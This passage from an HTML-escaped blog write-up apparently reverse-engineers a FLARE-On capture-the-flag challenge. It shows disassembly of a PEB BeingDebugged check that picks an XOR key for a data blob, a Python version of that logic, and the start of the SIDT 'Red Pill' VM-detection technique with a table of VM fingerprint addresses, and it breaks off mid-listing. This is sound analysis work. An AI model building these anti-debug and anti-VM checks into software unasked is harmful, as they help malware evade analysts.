&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h4 id=&#34;function-2-beingdebugged:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Function 2 - BeingDebugged?&lt;/h4&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B13&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;isDebuggerPresent&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B18&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4010C0&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;; you are here&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B1D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401130&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B22&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4011D0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B27&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4012A0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B2C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401350&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B31&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4013F0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B36&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401460&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4014F0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B42&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401590&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B47&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4016F0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s forget about the first compare and look at the outcome. Something is being compared with 1. If the compare succeeds then the first jump happens and we skip reseting &lt;code&gt;var_4&lt;/code&gt; to zero. The next jump will only happen if &lt;code&gt;var_4&lt;/code&gt; is zero which means that the last jump should not have happened. If the first compare succeeds (meaning &lt;code&gt;[eax+2]&lt;/code&gt; is 1) then we go left and otherwise right.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-4.jpg&#34; alt=&#34;BeingDebugged&#34; title=&#34;BeingDebugged&#34; /&gt;&lt;/p&gt;

&lt;p&gt;In both cases a string &lt;code&gt;UNACCEPTABLE!&lt;/code&gt; or &lt;code&gt;omglob&lt;/code&gt; are loaded along with address &lt;code&gt;byte_4131F8&lt;/code&gt; before a function call &lt;code&gt;sub_401000&lt;/code&gt;. The address points to a long stream of data.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-5.jpg&#34; alt=&#34;blob&#34; title=&#34;blob&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Looking inside &lt;code&gt;sub_401000&lt;/code&gt;. At the start &lt;code&gt;blob_length&lt;/code&gt; is loaded into &lt;code&gt;ecx&lt;/code&gt;. Then we enter a loop. If we step through the loop and look at the xor line, we can see that it is xor-ing &lt;code&gt;UNACCEPTABLE!&lt;/code&gt; with the data at &lt;code&gt;byte_4131F8&lt;/code&gt;. If we reach the end of the string it will restart from the first character. This loop will go on for &lt;code&gt;1073728&lt;/code&gt; bytes which seems to be length of data starting at &lt;code&gt;byte_4131F8&lt;/code&gt;. So &lt;code&gt;sub_401000&lt;/code&gt; is &lt;code&gt;string xor blob&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-6.jpg&#34; alt=&#34;xor function&#34; title=&#34;xor function&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Now let&amp;rsquo;s go back to the first compare.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004010&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;C6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004010&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;CD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;large&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;fs&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;30h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004010&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D3&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;What is the significance of &lt;code&gt;fs:30h&lt;/code&gt;? It is the &lt;code&gt;Process Environment Block (PEB)&lt;/code&gt; in the &lt;code&gt;Thread Information Block (TIB)&lt;/code&gt;. According to &lt;a href=&#34;http://msdn.microsoft.com/en-gb/library/windows/desktop/aa813706%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;MSDN&lt;/a&gt; it has the following structure. The application is comparing the 3rd byte with 1. The 3rd byte is called &lt;code&gt;BeingDebugged&lt;/code&gt; and is set to 1 if the application is being debugged. If we are running the application with a debugger it will be set to 1 and &lt;code&gt;UNACCEPTABLE!&lt;/code&gt; will be xor-ed with the &lt;code&gt;blob&lt;/code&gt; otherwise &lt;code&gt;omglob&lt;/code&gt;. More information about the &lt;code&gt;PEB&lt;/code&gt; can be found in the first section of the PDF &lt;code&gt;1.NtGlobalFlag&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;PEB Structure&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;_PEB&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;BYTE&lt;/span&gt;                          &lt;span style=&#34;color: #93A1A1&#34;&gt;Reserved1[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;];&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;BYTE&lt;/span&gt;                          &lt;span style=&#34;color: #93A1A1&#34;&gt;BeingDebugged;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;BYTE&lt;/span&gt;                          &lt;span style=&#34;color: #93A1A1&#34;&gt;Reserved2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;];&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;PVOID&lt;/span&gt;                         &lt;span style=&#34;color: #93A1A1&#34;&gt;Reserved3[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;];&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;PPEB_LDR_DATA&lt;/span&gt;                 &lt;span style=&#34;color: #93A1A1&#34;&gt;Ldr;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;PRTL_USER_PROCESS_PARAMETERS&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;ProcessParameters;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;BYTE&lt;/span&gt;                          &lt;span style=&#34;color: #93A1A1&#34;&gt;Reserved4[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;104&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;];&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;PVOID&lt;/span&gt;                         &lt;span style=&#34;color: #93A1A1&#34;&gt;Reserved5[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;52&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;];&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;PPS_POST_PROCESS_INIT_ROUTINE&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;PostProcessInitRoutine;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;BYTE&lt;/span&gt;                          &lt;span style=&#34;color: #93A1A1&#34;&gt;Reserved6[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;128&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;];&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;PVOID&lt;/span&gt;                         &lt;span style=&#34;color: #93A1A1&#34;&gt;Reserved7[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;];&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;ULONG&lt;/span&gt;                         &lt;span style=&#34;color: #93A1A1&#34;&gt;SessionId;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;PEB,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;PPEB;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;At this point we can rewrite this function in Python&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;BeingDebugged&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(BeingDebugged):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;UNACCEPTBALE!&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;omglob&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h4 id=&#34;function-3-vmware-detection-via-red-pill:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Function 3 - VMware Detection via Red Pill&lt;/h4&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B13&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;isDebuggerPresent&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B13&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;calls_isDebuggerPresent&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B18&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;BeingDebugged&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B1D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401130&lt;/span&gt;       &lt;span style=&#34;color: #586E75&#34;&gt;; you are here&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B22&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4011D0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B27&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4012A0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B2C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401350&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B31&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4013F0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B36&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401460&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4014F0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B42&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401590&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B47&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4016F0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-7.jpg&#34; alt=&#34;SIDT Red Pill&#34; title=&#34;SIDT Red Pill&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Jumping into &lt;code&gt;sub_401130&lt;/code&gt; we see an old anti-VM technique. This is called &lt;a href=&#34;http://repo.hackerzvoice.net/depot_ouah/Red_%20Pill.html&#34; target=&#34;_blank&#34;&gt;The Red Pill&lt;/a&gt;. Each CPU core has its own &lt;code&gt;Interrupt Descriptor Table (IDT}&lt;/code&gt;. IDT is essentially an interrupt vector table. Because the VM manager is juggling two operating systems but there is one location per core, it has to relocate IDT of guest OS in memory. The application can check this location for known addresses assigned by VM managers and determine if it is running in a VM.&lt;/p&gt;

&lt;p&gt;But how is this accomplished? Each core has one register called the &lt;code&gt;Interrupt Descriptor Table Register (IDTR)&lt;/code&gt; that points to this location in memory. The userland (ring3) instruction&lt;code&gt;SIDT&lt;/code&gt; will save this register. VM managers store the relocated tables in different places and the value of this register can act as a VM manager fingerprint.&lt;/p&gt;

&lt;p&gt;According to &lt;a href=&#34;http://vrt-blog.snort.org/2009/10/how-does-malware-know-difference.html&#34; target=&#34;_blank&#34;&gt;this post&lt;/a&gt; by Alain Zidouemba these are some of the addresses:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;|
| VM Manager |   Address  |
|------------|------------|
| Windows    | 0x80FFFFFF |
| Virtual PC | 0xE8XXXXXX |
| VMware     | 0xFFXXXXXX |
|
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;SIDT Red Pill&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7
8&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401138&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;sidt&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;fword&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040113&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_8&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; edi = IDT address (in this run 0xBAB3C590)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040113&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;bl&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ob_length&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; 0x106240&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401145&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;edi&lt;/span&gt;                     &lt;span style=&#34;color: #586E75&#34;&gt;; eax = edi = IDT address&lt;/span&gt;
